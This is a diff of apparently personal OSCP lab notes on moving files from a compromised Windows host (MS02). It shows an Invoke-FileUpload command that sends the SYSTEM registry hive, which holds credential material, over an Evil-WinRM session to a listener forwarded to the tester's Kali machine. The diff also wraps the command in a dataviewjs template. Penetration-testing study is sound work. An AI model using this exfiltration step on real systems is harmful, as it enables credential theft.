@@ -37,10 +37,13 @@ uploadserver 4445
 ```
 
 On TARGET host (MS02): _Evil-WinRM_ PS C:\Users\celia.almeda\Documents>
-```
-Invoke-FileUpload -Uri "http://[MS01 IP]:4445/upload" -File "C:\windows.old\windows\system32\SYSTEM"
-```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
+const command = `Invoke-FileUpload -Uri "http://${KaliIP}:4445/upload" -File "C:\PATH`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 Essentially, you are uploading a file to a listener on MS01, which is set up to auto-forward to Kali with the reverse port forward.
 
 ---
